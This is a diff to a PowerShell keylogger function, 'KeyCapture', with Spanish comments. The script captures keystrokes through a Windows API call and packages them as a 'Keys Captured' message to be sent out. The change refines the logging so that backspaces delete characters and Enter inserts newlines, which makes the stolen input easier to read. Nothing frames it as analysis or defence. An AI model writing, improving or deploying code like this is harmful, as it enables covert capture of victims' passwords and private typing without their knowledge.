@@ -43,17 +43,26 @@ Function KeyCapture {
                         $logchar = New-Object -TypeName System.Text.StringBuilder
                         if ($API::ToUnicode($asc, $vtkey, $kbst, $logchar, $logchar.Capacity, 0)) {
                             $LString = $logchar.ToString()
-                            if ($asc -eq 8) { $LString = "[BKSP]" }
-                            if ($asc -eq 13) { $LString = "[ENT]" }
-                            if ($asc -eq 27) { $LString = "[ESC]" }
-                            $capturedKeys += $LString
+
+                            # Si la tecla es Backspace (código 8), eliminamos el último carácter
+                            if ($asc -eq 8) {
+                                $capturedKeys = $capturedKeys.Substring(0, $capturedKeys.Length - 1)
+                            } 
+                            # Si la tecla es Enter (código 13), añadimos un salto de línea
+                            elseif ($asc -eq 13) {
+                                $capturedKeys += "`n"
+                            }
+                            # Si la tecla no es especial, la añadimos tal cual
+                            else {
+                                $capturedKeys += $LString
+                            }
                         }
                     }
                 }
             }
         } finally {
             if ($keyPressed) {
-                # Si hay teclas capturadas, se envían
+                # Si hay teclas capturadas, las enviamos
                 if ($capturedKeys.Length -gt 0) {
                     $escmsg = "Keys Captured: " + $capturedKeys
                     $MessageToSend | Add-Member -MemberType NoteProperty -Name 'text' -Value "$escmsg" -Force
